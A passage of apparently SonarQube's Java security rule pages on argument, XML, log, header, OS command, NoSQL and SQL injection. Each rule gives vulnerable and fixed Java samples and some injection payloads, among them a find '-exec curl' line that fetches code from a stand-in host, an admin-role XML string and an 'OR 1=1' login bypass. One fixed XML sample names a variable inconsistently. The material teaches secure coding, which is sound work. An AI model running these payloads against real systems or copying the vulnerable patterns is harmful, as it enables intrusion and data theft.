<ul><li> Docker or Kubernetes clusters </li><li> cloud services </li><li> network firewalls and routing </li><li> OS access control </li></ul>
<h2>How to fix it in Java SE</h2>
<h3>Code examples</h3>
<p>The following code uses the <code>find</code> command and expects the user to enter the name of a file to find on the system.</p>
<p>It is vulnerable to argument injection because untrusted data is inserted in the arguments of a process call without prior validation or
sanitization.<br /> Here, the application ignores that a user-submitted parameter might contain special characters that will tamper with the expected
system command behavior.</p>
<p>In this particular case, an attacker might add arbitrary arguments to the <code>find</code> command for malicious purposes. For example, the
following payload will download malicious software on the application’s hosting server.</p>
<pre>
 -exec curl -o /var/www/html/ http://evil.example.org/malicious.php ;
</pre>
<h4>Noncompliant code example</h4>
<pre data-diff-id="11" data-diff-type="noncompliant">
&#64;Controller
public class ExampleController
{
    &#64;GetMapping(value &#61; &#34;/find&#34;)
    public void find(&#64;RequestParam(&#34;filename&#34;) String filename) throws IOException {

        Runtime.getRuntime().exec(&#34;/usr/bin/find . -iname &#34; &#43; filename);
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="11" data-diff-type="compliant">
&#64;Controller
public class ExampleController
{
    &#64;GetMapping(value &#61; &#34;/find&#34;)
    public void find(&#64;RequestParam(&#34;filename&#34;) String filename) throws IOException {

        String cmd1[] &#61; new String[] {&#34;/usr/bin/find&#34;, &#34;.&#34;, &#34;-iname&#34;, filename};
        Process proc &#61; Runtime.getRuntime().exec(cmd1); // Compliant
    }
}
</pre>
<p>java.lang.Runtime is sometimes used over java.lang.ProcessBuilder due to ease of use. Flexibility in methods often introduces security issues as
edge cases are easily missed. The compliant solution logic is also applied to java.lang.ProcessBuilder.</p>
<h3>How does this work?</h3>
<p>Allowing users to insert data in operating system commands generally creates more problems than it solves.</p>
<p>Anything that can be done via operating system commands can usually be done via a language’s native SDK.<br /> Therefore, our suggestion is to avoid
using OS commands in the first place.</p>
<p>Here <code>java.lang.Runtime.exec(String[] cmdarray)</code> takes care of escaping the passed arguments and internally creates a single string
given to the operating system to be executed.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul><li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html" rel="nofollow">OWASP, OS Command Injection Defense
  Cheat Sheet</a> </li><li> <a href="https://gtfobins.github.io/#&#43;shell" rel="nofollow">GTFOBins, list of Unix binaries that can be used to bypass local security restrictions</a> </li><li> <a href="https://lolbas-project.github.io/#" rel="nofollow">LOLBAS, list of Windows binaries that can be used to bypass local security restrictions</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/88" rel="nofollow">MITRE, CWE-88</a> - Argument Injection or Modification </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javasecurity:S6399">
              javasecurity:S6399
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>XML injections occur when an application builds an XML-formatted string from user input without prior validation or sanitation. In such a case, a
tainted user-controlled value can tamper with the XML string content. Especially, unexpected arbitrary elements and attributes can be inserted in the
corresponding XML description.</p>
<p>A malicious injection payload could, for example:</p>
<ul><li> Insert tags into the main XML document. </li><li> Add attributes to an existing XML tag. </li><li> Change the data value inside a tag. </li></ul>
<p>A malicious user-supplied value can perform other modifications depending on where and how the constructed data is later used.</p>
<h3>What is the potential impact?</h3>
<p>The consequences of an XML injection attack on an application vary greatly depending on the application’s logic. It can affect the application
itself or another element if the XML document is used for cross-component data exchange. For this reason, the actual impact can range from benign
information disclosure to critical remote code execution.</p>
<h4>Information disclosure</h4>
<p>An attacker can forge an attack payload that will modify the XML document so that it will become syntactically incorrect. In that case, when the
data is later used, the parsing component will raise a technical error. If displayed back to the attacker or made available through log files, this
technical error may disclose sensitive business or technical information.</p>
<p>This scenario, while in general the less severe one, is the most frequently encountered. It can combine with any other logic-dependant threat.</p>
<h4>Internal requests tampering</h4>
<p>Some applications communicate with backend micro-services APIs using XML-based protocols such as SOAP. When those applications are vulnerable to
XML injections, attackers can tamper with the internal requests&#39; content. This will allow them to change internal requests&#39; parameters or locations
which, in turn, can lead to various consequences like performing unauthorized actions or accessing sensitive data.</p>
<p>For example, altering a user creation request in such a way can lead to a privilege escalation if attackers manage to modify the default account
privilege level.</p>
<h4>Code execution</h4>
<p>An application might build objects based on an XML serialization string. In that case, an attacker that would exploit an XML injection could be
able to alter the serialization string to modify the corresponding object’s properties.</p>
<p>Depending on the deserialization process, this might allow instantiating arbitrary objects or objects with sensitive properties altered. This can
lead to arbitrary code being executed in the same way as a deserialization injection vulnerability.</p>
<h2>How to fix it in Java SE</h2>
<h3>Code examples</h3>
<p>The following code is an example of an overly simple authentication function: The role of a user is set in an XML file and the default user role is
<code>user</code>.<br /> This example code is vulnerable to an XML injection vulnerability because it builds an XML string from user input without prior
sanitation or validation.</p>
<p>In this particular case, the query can be exploited with the following string:</p>
<pre>
attacker&lt;/username&gt;&lt;role&gt;admin&lt;/role&gt;&lt;/user&gt;
&lt;user&gt;&lt;username&gt;foo
</pre>
<p>By adapting and inserting this string into the <code>username</code> field, an attacker would be able to log in as an admin.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;

protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
    String xml &#61;
        &#34;&#34;&#34;&lt;user&gt;
            &lt;username&gt;&#34;&#34;&#34;&#43;req.getParameter(&#34;username&#34;)&#43;&#34;&#34;&#34;&lt;/username&gt;
            &lt;role&gt;user&lt;/role&gt;
        &lt;/user&gt;&#34;&#34;&#34;;

    DocumentBuilderFactory factory &#61; DocumentBuilderFactory.newInstance();

    try {
        DocumentBuilder builder &#61; factory.newDocumentBuilder();
        builder.parse(new InputSource(new StringReader(xml))); // Noncompliant
    } catch (ParserConfigurationException | SAXException e) {
        resp.sendError(400);
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import org.w3c.dom.Document;
import org.w3c.dom.Element;

protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {

    DocumentBuilderFactory factory &#61; DocumentBuilderFactory.newInstance();

    try {
        DocumentBuilder builder &#61; factory.newDocumentBuilder();
        Document doc &#61; builder.newDocument();
        Element user &#61; doc.createElement(&#34;user&#34;);
        doc.appendChild(user);

        Element usernameElement &#61; doc.createElement(&#34;username&#34;);
        user.appendChild(usernameElement);
        username_element.setTextContent(req.getParameter(&#34;username&#34;));

        Element role &#61; doc.createElement(&#34;role&#34;);
        user.appendChild(role);
        role.setTextContent(&#34;user&#34;);

    } catch (ParserConfigurationException e) {
        resp.sendError(400);
    }
}
</pre>
<h3>How does this work?</h3>
<p>In most cases, building XML strings with a direct concatenation of user input is discouraged. While not always possible, a strong pattern-based
validation can help sanitize tainted inputs. Likewise, converting to a harmless type can sometimes be a solution.</p>
<p>However, directly constructing Java objects should be preferred over handling the properties of objects as strings.</p>
<h4>Programmatic object building</h4>
<p>In most cases, an application can directly create documents from user input without having to build and parse an XML string. Doing so prevents
injection vulnerabilities as XML document construction libraries and functions will properly escape and check the type of input values.</p>
<p>Sometimes, the application might need to include the user input in a document built from a trusted XML string. In that case, the recommended
solution is to parse the trusted string first and then programmatically modify the resulting document.</p>
<p>The example compliant code takes advantage of the <code>javax.xml</code> and <code>org.w3c.dom</code> libraries capabilities to programmatically
build XML documents.</p>
<h4>Converting to a harmless type</h4>
<p>When the application allows it, casting user-submitted data to a harmless type can help prevent XML injection vulnerabilities. In particular,
converting user inputs to numeric types is an efficient sanitation mechanism.</p>
<p>This mechanism can be extended to other types, including more complex ones. However, care should be taken when dealing with them, as manually
validating or sanitizing complex types can represent a challenge.</p>
<p>Note that choosing this solution can be error-prone: every user input has to be validated or sanitized without oversight.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/91" rel="nofollow">MITRE, CWE-91</a> - XML Injection (aka Blind XPath Injection) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javasecurity:S5145">
              javasecurity:S5145
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Log injection occurs when an application fails to sanitize untrusted data used for logging.</p>
<p>An attacker can forge log content to prevent an organization from being able to trace back malicious activities.</p>
<h3>What is the potential impact?</h3>
<p>If an attacker can insert arbitrary data into a log file, the integrity of the chain of events being recorded can be compromised.<br /> This
frequently occurs because attackers can inject the log entry separator of the logger framework, commonly newlines, and thus insert artificial log
entries. <br /> Other attacks could also occur requiring only field pollution, such as cross-site scripting (XSS) or code injection (for example,
Log4Shell) if the logged data is fed to other application components, which may interpret the injected data differently.<br /></p>
<p>The focus of this rule is newline character replacement.</p>
<h4>Log Forge</h4>
<p>An attacker, able to create independent log entries by injecting log entry separators, inserts bogus data into a log file to conceal his malicious
activities. This obscures the content for an incident response team to trace the origin of the breach as the indicators of compromise (IoCs) lead to
fake application events.</p>
<h2>How to fix it in Java SE</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to log injection as it constructs log entries using untrusted data. An attacker can leverage this to manipulate
the chain of events being recorded.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
private static final Logger logger &#61; Logger.getLogger(&#34;Logger&#34;);

protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {

  String data &#61; request.getParameter(&#34;data&#34;);
  if(data !&#61; null){
    logger.log(Level.INFO, &#34;Data: {0} &#34;, data);
  }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
private static final Logger logger &#61; Logger.getLogger(&#34;Logger&#34;);

protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {

  String data &#61; request.getParameter(&#34;data&#34;);
  if(data !&#61; null){
    data &#61; data.replaceAll(&#34;[\n\r]&#34;, &#34;_&#34;);
    logger.log(Level.INFO, &#34;Data: {0} &#34;, data);
  }
}
</pre>
<h3>How does this work?</h3>
<p>Data used for logging should be content-restricted and typed. This can be done by validating the data content or sanitizing it.<br /> Validation and
sanitization mainly revolve around preventing carriage return (CR) and line feed (LF) characters. However, further actions could be required based on
the application context and the logged data usage.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/" rel="nofollow">OWASP Top 10 2021 Category A9</a> - Security Logging and
  Monitoring Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A10_2017-Insufficient_Logging%2526Monitoring" rel="nofollow">OWASP Top 10 2017 Category A10</a> -
  Insufficient Logging &amp; Monitoring </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/117" rel="nofollow">MITRE, CWE-117</a> - Improper Output Neutralization for Logs </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javasecurity:S5167">
              javasecurity:S5167
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href="/organizations/sopra-steria/rules?open&#61;java%3AS5122&amp;rule_key&#61;java%3AS5122" rel="nofollow">S5122</a>, <a href="/organizations/sopra-steria/rules?open&#61;java%3AS5146&amp;rule_key&#61;java%3AS5146" rel="nofollow">S5146</a>, <a href="/organizations/sopra-steria/rules?open&#61;java%3AS6287&amp;rule_key&#61;java%3AS6287" rel="nofollow">S6287</a> instead.</p>
<h2>Why is this an issue?</h2>
<p>User-provided data, such as URL parameters, POST data payloads, or cookies, should always be considered untrusted and tainted. Applications
constructing HTTP response headers based on tainted data could allow attackers to change security sensitive headers like Cross-Origin Resource Sharing
headers.</p>
<p>Web application frameworks and servers might also allow attackers to inject new line characters in headers to craft malformed HTTP response. In
this case the application would be vulnerable to a larger range of attacks like HTTP Response Splitting/Smuggling. Most of the time this type of
attack is mitigated by default modern web application frameworks but there might be rare cases where older versions are still vulnerable.</p>
<p>As a best practice, applications that use user-provided data to construct the response header should always validate the data first. Validation
should be based on a whitelist.</p>
<h3>Noncompliant code example</h3>
<pre>
protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
  String value &#61; req.getParameter(&#34;value&#34;);
  resp.addHeader(&#34;X-Header&#34;, value); // Noncompliant
}
</pre>
<h3>Compliant solution</h3>
<pre>
protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
    String value &#61; req.getParameter(&#34;value&#34;);

    String whitelist &#61; &#34;safevalue1 safevalue2&#34;;
    if (!whitelist.contains(value))
      throw new IOException();

    resp.addHeader(&#34;X-Header&#34;, value); // Compliant
}
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/HTTP_Response_Splitting" rel="nofollow">OWASP Attack Category</a> - HTTP Response Splitting </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/113" rel="nofollow">MITRE, CWE-113</a> - Improper Neutralization of CRLF Sequences in HTTP Headers (&#39;HTTP
  Response Splitting&#39;) </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS Top 25</a> - Insecure Interaction Between Components </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javasecurity:S2076">
              javasecurity:S2076
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>OS command injections occur when applications build command lines from untrusted data before executing them with a system shell.<br /> In that case,
an attacker can tamper with the command line construction and force the execution of unexpected commands. This can lead to the compromise of the
underlying operating system.</p>
<h3>What is the potential impact?</h3>
<p>An attacker exploiting an OS command injection vulnerability will be able to execute arbitrary commands on the underlying operating system.</p>
<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process runs with root privileges,
and therefore any OS commands or programs may be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Denial of service and data leaks</h4>
<p>In this scenario, the attack aims to disrupt the organization’s activities and profit from data leaks.</p>
<p>An attacker could, for example:</p>
<ul><li> download the internal server’s data, most likely to sell it </li><li> modify data, send malware </li><li> stop services or exhaust resources (with fork bombs for example) </li></ul>
<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h4>Root privilege escalation and pivot</h4>
<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate
their privileges to an administrative level and attacks other servers.</p>
<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised
by a combination of OS injections and <strong>misconfiguration</strong> of:</p>
<ul><li> Docker or Kubernetes clusters </li><li> cloud services </li><li> network firewalls and routing </li><li> OS access control </li></ul>
<h2>How to fix it in Apache Commons</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to command injections because it is using untrusted inputs to set up a new process. Therefore an attacker can
execute an arbitrary program that is installed on the system.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
&#64;Controller
public class ExampleController
{
    &#64;GetMapping(value &#61; &#34;/exec&#34;)
    public void exec(&#64;RequestParam(&#34;command&#34;) String command) throws IOException {

        CommandLine cmd &#61; new CommandLine(command);
        DefaultExecutor executor &#61; new DefaultExecutor();
        executor.execute(cmd);
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
&#64;Controller
public class ExampleController
{
    &#64;GetMapping(value &#61; &#34;/exec&#34;)
    public void exec(&#64;RequestParam(&#34;command&#34;) String command) throws IOException {

        List&lt;String&gt; allowedCmds &#61; new ArrayList&lt;String&gt;();
        allowedCmds.add(&#34;/bin/ls&#34;);
        allowedCmds.add(&#34;/bin/cat&#34;);

        if (allowedCmds.contains(command)){
            CommandLine cmd &#61; new CommandLine(command);
            DefaultExecutor executor &#61; new DefaultExecutor();
            executor.execute(cmd);
        }
    }
}
</pre>
<h3>How does this work?</h3>
<p>Allowing users to execute operating system commands generally creates more problems than it solves.</p>
<p>Anything that can be done via operating system commands can usually be done via a language’s native SDK.<br /> Therefore, our first suggestion is to
avoid using OS commands in the first place.<br /> However, if the application requires running OS commands with user-controlled data, here are some
security suggestions.</p>
<h4>Pre-Approved commands</h4>
<p>If the application aims to execute only a small number of OS commands (for example, <code>ls</code>, <code>pwd</code>, and <code>grep</code>), the
cleanest way to avoid this problem is to validate the input before using it in an OS command.</p>
<p>Create a list of authorized and secure commands that you want the application to be able to execute. Use absolute paths to avoid any ambiguity.<br />
If a user input does not match an entry in this list, it should be rejected because it is considered unsafe.</p>
<p>Depending on the number of commands you want the application to support, the list can be either a regex string or any array type. If you use
regexes, choose simple regexes to avoid ReDOS attacks. For example, you can accept only a specific set of executables, by using
<code>^/bin/(ls|pwd|grep)$</code>.</p>
<p><strong>Important note</strong>: The application must do validation on the server side. Not on client-side front-ends.</p>
<h4>Neutralize special characters</h4>
<p>If the application is to execute complex commands that cannot be controlled thanks to pre-approved lists, the cleanest approach is to use special
sanitization components, such as <code>org.apache.commons.exec.CommandLine.addArguments(String[] addArguments)</code>.</p>
<p>The library helps you to get rid of common dangerous characters, such as:</p>
<ul><li> <code>&amp;</code> </li><li> <code>|</code> </li><li> <code>;</code> </li><li> <code>$</code> </li><li> <code>&gt;</code> </li><li> <code>&lt;</code> </li><li> <code>\&#96;</code> </li><li> <code>\\</code> </li><li> <code>!</code> </li></ul>
<p>If user input is to be included in the arguments of a command, the application must ensure that dangerous options or argument delimiters are
neutralized.<br /> Argument delimiters count <code>&#39;</code>, <code>-</code> and spaces.</p>
<p>For example, the <code>find</code> command from UNIX supports the dangerous argument <code>-exec</code>.<br /> In this case, option processing can be
terminated with a string containing <code>--</code> or with special options. For example, <code>git</code> supports <code>--end-of-options</code> <a href="https://github.blog/2019-11-03-highlights-from-git-2-24/#tidbits" rel="nofollow">since its version 2.24</a>.</p>
<p>Here <code>org.apache.commons.exec.CommandLine.addArguments(String[] addArguments)</code> takes care of escaping the passed arguments and
internally creates a single string given to the operating system to be executed.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul><li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html" rel="nofollow">OWASP, OS Command Injection Defense
  Cheaty Sheet</a> </li><li> <a href="https://gtfobins.github.io/#&#43;shell" rel="nofollow">GTFOBins, list of Unix binaries that can be used to bypass local security restrictions</a> </li><li> <a href="https://lolbas-project.github.io/#" rel="nofollow">LOLBAS, list of Windows binaries that can be used to bypass local security restrictions</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/78" rel="nofollow">MITRE, CWE-78</a> - Improper Neutralization of Special Elements used in an OS Command </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javasecurity:S5147">
              javasecurity:S5147
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>NoSQL injections occur when an application retrieves untrusted data and inserts it into a database query without sanitizing it first.</p>
<h3>What is the potential impact?</h3>
<p>In the context of a web application that is vulnerable to NoSQL injection:<br /> After discovering the injection point, attackers insert data into
the vulnerable field to execute malicious commands in the affected databases.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Identity spoofing and data leakage</h4>
<p>In the context of simple query logic breakouts, a malicious database query enables privilege escalation or direct data leakage from one or more
databases.<br /> This threat is the most widespread impact.</p>
<h4>Data deletion and denial of service</h4>
<p>The malicious query makes it possible for the attacker to delete data in the affected databases.<br /> This threat is particularly insidious if the
attacked organization does not maintain a disaster recovery plan (DRP) as missing data can disrupt the regular operations of an organization.</p>
<h4>Chaining NoSQL injections with other vulnerabilities</h4>
<p>Attackers who exploit NoSQL injections rely on other vulnerabilities to maximize their profits.<br /> Most of the time, organizations overlook some
defense in depth measures because they assume attackers cannot reach certain points in the infrastructure. This misbehavior can lead to multiple
attacks with great impact:</p>
<ul><li> When secrets are stored unencrypted in databases: Secrets can be exfiltrated and lead to compromise of other components. </li><li> If server-side OS and/or database permissions are misconfigured, injection can lead to remote code execution (RCE). </li></ul>
<h2>How to fix it in Legacy Mongo Java API</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to NoSQL injections because untrusted data is concatenated to the <code>$where</code> operator. This operator
indicates to the backend that the expression needs to be interpreted, resulting in code injection.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import com.mongodb.MongoClient;
import com.mongodb.DB;
import com.mongodb.DBCollection;
import com.mongodb.BasicDBObject;

protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws UnknownHostException
{
    String input &#61; req.getParameter(&#34;input&#34;);

    MongoClient mongoClient &#61; new MongoClient();
    DB database             &#61; mongoClient.getDB(&#34;ExampleDatabase&#34;);
    DBCollection collection &#61; database.getCollection(&#34;exampleCollection&#34;);
    BasicDBObject query     &#61; new BasicDBObject();

    query.append(&#34;$where&#34;, &#34;this.field &#61;&#61; \&#34;&#34; &#43; input &#43; &#34;\&#34;&#34;);

    collection.find(query);
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import com.mongodb.MongoClient;
import com.mongodb.DB;
import com.mongodb.DBCollection;
import com.mongodb.BasicDBObject;

protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws UnknownHostException
{
    String input &#61; req.getParameter(&#34;input&#34;);

    MongoClient mongoClient &#61; new MongoClient();
    DB database             &#61; mongoClient.getDB(&#34;ExampleDatabase&#34;);
    DBCollection collection &#61; database.getCollection(&#34;exampleCollection&#34;);
    BasicDBObject query     &#61; new BasicDBObject();

    query.append(&#34;field&#34;, input);

    collection.find(query);
}
</pre>
<h3>How does this work?</h3>
<h4>Pre-approved list</h4>
<p>As a rule of thumb, the best approach to protect against injections is to systematically ensure that untrusted data cannot break out of the
initially intended logic.</p>
<p>For NoSQL injections, the cleanest way to do so is to validate the input before using it in a query.</p>
<p>Create a list of authorized and secure strings that you want the application to be able to use in a query.<br /> If a user input does not match an
entry in this list, it should be rejected because it is considered unsafe.</p>
<p>The list can be either a regex string, an array, or validators on specific ranges of characters. If you use regexes, choose simple regexes to avoid
ReDOS attacks.</p>
<p><strong>Important note</strong>: The application must do validation on the server side. Not on client-side front-ends.</p>
<h4>Operators are to be classified as dangerous</h4>
<p>As a rule of thumb if no operators are needed, you should generally reject user input containing them. If some operators are necessary, you should
restrict their use.</p>
<p>Some operators execute JavaScript, and their use should be restricted for both untrusted input and internal code.<br /> These operators include:</p>
<ul><li> <code>$where</code> </li><li> <code>$function</code> </li><li> <code>$accumulator</code> </li><li> <code>mapReduce</code> </li></ul>
<p>Depending on your use case, you should first try using regular API calls before using any of these operators.<br /> For example, using a
<code>$where</code> operator is unnecessarily complex when only a simple search is required. It also leads to performance problems.</p>
<p><strong>Note</strong>: <a href="https://www.mongodb.com/docs/manual/reference/operator/query/where/#javascript-enablement" rel="nofollow">Server-side scripting
can be disabled</a>.</p>
<p>Regular operators can also lead to data leaks.<br /> For example, attackers can use &#34;comparison query operators&#34; in their attack data to trick the
backend database into giving hints about sensitive information or entirely giving it out.</p>
<p>In the previous example, the untrusted data doesn’t need validation for its use case. Moving it out of a <code>$where</code> expression into a
proper field query is enough.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://blog.sonarsource.com/nosql-injections-in-rocket-chat/" rel="nofollow">SonarSource, NoSQL Injections in Rocket.Chat 3.12.1</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/943" rel="nofollow">MITRE, CWE-943</a> - Improper Neutralization of Special Elements in Data Query Logic </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javasecurity:S3649">
              javasecurity:S3649
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Database injections (such as SQL injections) occur in an application when the application retrieves data from a user or a third-party service and
inserts it into a database query without sanitizing it first.</p>
<p>If an application contains a database query that is vulnerable to injections, it is exposed to attacks that target any database where that query is
used.</p>
<p>A user with malicious intent carefully performs actions whose goal is to modify the existing query to change its logic to a malicious one.</p>
<p>After creating the malicious request, the attacker can attack the databases affected by this vulnerability without relying on any
pre-requisites.</p>
<h3>What is the potential impact?</h3>
<p>In the context of a web application that is vulnerable to SQL injection:<br /> After discovering the injection, attackers inject data into the
vulnerable field to execute malicious commands in the affected databases.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Identity spoofing and data manipulation</h4>
<p>A malicious database query enables privilege escalation or direct data leakage from one or more databases. This threat is the most widespread
impact.</p>
<h4>Data deletion and denial of service</h4>
<p>The malicious query makes it possible for the attacker to delete data in the affected databases.<br /> This threat is particularly insidious if the
attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h4>Chaining DB injections with other vulnerabilities</h4>
<p>Attackers who exploit SQL injections rely on other vulnerabilities to maximize their profits.<br /> Most of the time, organizations overlook some
defense in depth measures because they assume attackers cannot reach certain points in the infrastructure. This misbehavior can lead to multiple
attacks with great impact:</p>
<ul><li> When secrets are stored unencrypted in databases: Secrets can be exfiltrated and lead to compromise of other components. </li><li> If server-side OS and/or database permissions are misconfigured, injection can lead to remote code execution (RCE).
    <ul><li> See <a href="https://blog.sonarsource.com/exploiting-hibernate-injections/" rel="nofollow">our article on this topic</a> </li></ul>  </li></ul>
<h2>How to fix it in Java SE</h2>
<h3>Code examples</h3>
<p>The following code is an example of an overly simple authentication function. It is vulnerable to SQL injection because user-controlled data is
inserted directly into a query string: The application assumes that incoming data always has a specific range of characters, and ignores that some
characters may change the query logic to a malicious one.</p>
<p>In this particular case, the query can be exploited with the following string:</p>
<pre>
foo&#39; OR 1&#61;1 --
</pre>
<p>By adapting and inserting this template string into one of the fields (<code>user</code> or <code>pass</code>), an attacker would be able to log in
as any user within the scoped user table.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="11" data-diff-type="noncompliant">
&#64;RestController
public class ApiController
{
    &#64;Autowired
    Connection connection;

    &#64;GetMapping(value &#61; &#34;/authenticate&#34;)
    &#64;ResponseBody
    public ResponseEntity&lt;String&gt; authenticate(
        &#64;RequestParam(&#34;user&#34;) String user,
        &#64;RequestParam(&#34;pass&#34;) String pass) throws SQLException
    {
        String query &#61; &#34;SELECT * FROM users WHERE user &#61; &#39;&#34; &#43; user &#43; &#34;&#39; AND pass &#61; &#39;&#34; &#43; pass &#43; &#34;&#39;&#34;;

        try (Statement statement &#61; connection.createStatement()) {

            ResultSet resultSet &#61; statement.executeQuery(query);

            if (!resultSet.next()) {
                return new ResponseEntity&lt;&gt;(&#34;Unauthorized&#34;, HttpStatus.UNAUTHORIZED);
            }
        }

        return new ResponseEntity&lt;&gt;(&#34;Authentication Success&#34;, HttpStatus.OK);
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="11" data-diff-type="compliant">
&#64;RestController
public class ApiController
{
    &#64;Autowired
    Connection connection;

    &#64;GetMapping(value &#61; &#34;/authenticate&#34;)
    &#64;ResponseBody
    public ResponseEntity&lt;String&gt; authenticate(
        &#64;RequestParam(&#34;user&#34;) String user,
        &#64;RequestParam(&#34;pass&#34;) String pass) throws SQLException
    {
